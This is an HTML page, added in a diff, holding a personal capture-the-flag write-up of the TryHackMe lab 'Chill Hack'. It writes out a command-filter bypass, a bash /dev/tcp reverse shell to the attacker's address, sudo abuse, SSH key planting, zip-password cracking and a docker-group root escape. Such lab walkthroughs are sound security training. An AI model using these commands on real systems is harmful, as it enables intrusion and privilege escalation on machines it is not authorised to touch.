@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chill Hack — Write-Up</title>
+    <link rel="stylesheet" href="Writeups.css">
+    <link rel="stylesheet" href="../styles.css">
+</head>
+
+<body>
+
+<div class="sidebar">
+    <h2>~/home</h2>
+    <a href="../index.html">Home</a>
+    <a href="../about.html">About Me</a>
+    <a href="../projects.html">Projects</a>
+    <a href="../writeups.html" class="active">Write-Ups</a>
+    <a href="../contact.html">Contact</a>
+
+    <div class="social-icons">
+        <a href="https://www.linkedin.com/in/iustin-barbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/linkedin.svg" alt="LinkedIn">
+        </a>
+        <a href="https://github.com/IustinBarbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/github.svg" alt="GitHub">
+        </a>
+        <a href="https://tryhackme.com/p/Glitch21" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/tryhackme.svg" alt="TryHackMe">
+        </a>
+    </div>
+</div>
+
+<section id="writeup-container">
+    <div class="writeup-content">
+        <h1>Chill Hack</h1>
+
+        <p>Started with a fast nmap scan:</p>
+        <pre><code>└─$ sudo nmap -sS -sV -sC -T5 -A 10.10.106.225</code></pre>
+
+        <p>21 ftp, 22 ssh and 80 http are open</p>
+
+        <p>ftp allows anonymous access, so I logged in and got the <code>note.txt</code> file. Anurodh told me that there is some filtering on strings being put in the command -- Apaar.</p>
+
+        <p>Nothing else in ftp, so I guess two usernames is all i'm getting for now.</p>
+
+        <p>Went to test the website while a dirb scan is running in the background. Found this in a comment on page source:</p>
+        <pre><code>&lt;!--made by vipul mirajkar thevipulm.appspot.com--&gt;</code></pre>
+        <p>But seems like a dead end for now.</p>
+
+        <p>Dirb found <code>/secret</code> on the page, which leads to a box in which you can type a command and there is a button to execute it.</p>
+
+        <p>Tries some html code and it did not work, but the ls command triggered an alert - "Are you a hacker?"</p>
+
+        <p>Nothing interesting about this in Burp either, so let's try making the ls command work by changing how it looks:</p>
+        <pre><code>ls${IFS}-la
+total 16
+drwxr-xr-x 3 root root 4096 Oct 4 2020 .
+drwxr-xr-x 8 root root 4096 Oct 3 2020 ..
+drwxr-xr-x 2 root root 4096 Oct 3 2020 images
+-rw-r--r-- 1 root root 1520 Oct 4 2020 index.php</code></pre>
+        <p>Nothing really important?</p>
+
+        <pre><code>SELECT * FROM users WHERE username = 'user' AND password = 'pass';</code></pre>
+        <p>Shows nothing either.</p>
+
+        <p>Ok, let's also try to get a shell:</p>
+        <pre><code>nc -nvlp 1234
+
+then, on the command, type
+/bin/bash -c '/bin/bash -i >& /dev/tcp/10.9.3.37/1234 0>&1'</code></pre>
+
+        <pre><code>listening on [any] 1234 ...
+connect to [10.9.3.37] from (UNKNOWN) [10.10.106.225] 57174
+bash: cannot set terminal process group (835): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ip-10-10-106-225:/var/www/html/secret$</code></pre>
+
+        <p>There we go, now commands work.</p>
+
+        <pre><code>www-data@ip-10-10-106-225:/var/www/html/secret$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on ip-10-10-106-225:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ip-10-10-106-225:
+    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh</code></pre>
+
+        <p>So we can run commands as apaar, therefore the local flag is probably related to this user:</p>
+        <pre><code>ls -lah /home/apaar/</code></pre>
+        <p>Here we have <code>local.txt</code>, but we don't have permission to cat this out:</p>
+        <pre><code>cat: /home/apaar/local.txt: Permission denied</code></pre>
+
+        <p>So we do:</p>
+        <pre><code>www-data@ip-10-10-106-225:/var/www/html/secret$ sudo -u apaar /home/apaar/.helpline.sh
+Welcome to helpdesk. Feel free to talk to anyone at any time!</code></pre>
+
+        <p>Now, in the message, put this payload:</p>
+        <pre><code>/usr/bin/script -qc /bin/bash /dev/null</code></pre>
+        <p>and <code>cat /home/apaar/local.txt</code> to get the flag.</p>
+
+        <p>For the next part I had to look at some writeups. Need to create a SSH key pair, and I will do this using ssh-keygen:</p>
+        <pre><code>$ ssh-keygen -f apaar
+Generating public/private ed25519 key pair.
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in apaar
+Your public key has been saved in apaar.pub
+The key fingerprint is:
+SHA256:vx4/Z8vyINnFKxHsnEbO8I2SJS8+C2CT2nOlYFPTNUU glitch@Kali
+The key's randomart image is:
++--[ED25519 256]--+
+|            ooE  |
+|         . o .   |
+|        o + =    |
+|       o . & *   |
+|      O S = % +  |
+|     = = = * o . |
+|    . o + B + .  |
+|       o . Bo+o  |
+|         .+ .*+. |
++----[SHA256]-----+</code></pre>
+
+        <p>Copy the public key to <code>authorized_keys</code> file on apaar's .ssh folder.</p>
+
+        <pre><code>$ ssh -L 1234:&lt;kali IP&gt;:1234 -i apaar@10.10.35.165</code></pre>
+
+        <p>Then access port 1234 on Kali using the browser.</p>
+
+        <p>The website is vulnerable to SQL injection, as we can see from <code>account.php</code> file, where there is no filter or sanitization on input, therefore this can be exploited using simple sqli payloads.</p>
+
+        <p>I downloaded the image and used steghide to find <code>backup.zip</code>:</p>
+        <pre><code>steghide extract -sf hacker-with-laptop_23-2147985341.jpg</code></pre>
+
+        <p>Since the zip requires a password, I used zip2john (flashback to Bitdefender CTF qualifications):</p>
+        <pre><code>zip2john backup.zip &gt; backup.hash</code></pre>
+        <p>Then crack it using john:</p>
+        <pre><code>john backup.hash --wordlist=rockyou.txt</code></pre>
+
+        <p>Unzip the file and we have a php script in which there is an user - Anurodha - and a password, which needs to be decoded from Base64.</p>
+
+        <p>su to Anurodha, enter the password and use the following one-liner from GTFOBins to get a root shell (since this user is in the docker group):</p>
+        <pre><code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code></pre>
+
+    </div>
+</section>
+
+</body>
+</html>
